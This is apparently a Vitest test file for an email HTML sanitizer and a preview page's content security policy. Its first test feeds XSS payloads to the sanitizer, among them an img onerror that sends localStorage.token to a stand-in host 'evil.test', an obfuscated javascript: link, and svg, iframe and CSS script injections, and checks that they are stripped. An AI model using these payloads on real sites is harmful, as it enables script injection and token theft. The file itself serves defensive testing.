import { describe, expect, it } from 'vitest';
import { sanitizeEmailHtml } from '../src/utils/html-sanitize-utils';
import emailHtmlTemplate from '../src/template/email-html';

describe('email HTML sanitization', () => {
	it('removes executable markup and unsafe URLs', () => {
		const sanitized = sanitizeEmailHtml(`
			<img src="x" onerror="fetch('https://evil.test/' + localStorage.token)">
			<a href="java\nscript:alert(1)">click</a>
			<svg onload="alert(1)"></svg>
			<iframe srcdoc="<script>alert(1)</script>"></iframe>
			<p style="background:url(javascript:alert(1))">safe text</p>
		`);

		expect(sanitized).toContain('safe text');
		expect(sanitized).not.toMatch(/onerror|javascript:|<svg|<iframe|<script/i);
		expect(sanitizeEmailHtml('<p>hello</p>')).toBe('<p>hello</p>');
	});

	it('renders the public preview with scripts and outbound requests disabled', () => {
		const page = emailHtmlTemplate('<p>hello</p>', 'https://assets.example.com');

		expect(page).toContain("script-src 'none'");
		expect(page).toContain("connect-src 'none'");
		expect(page).not.toContain('<script');
	});
});
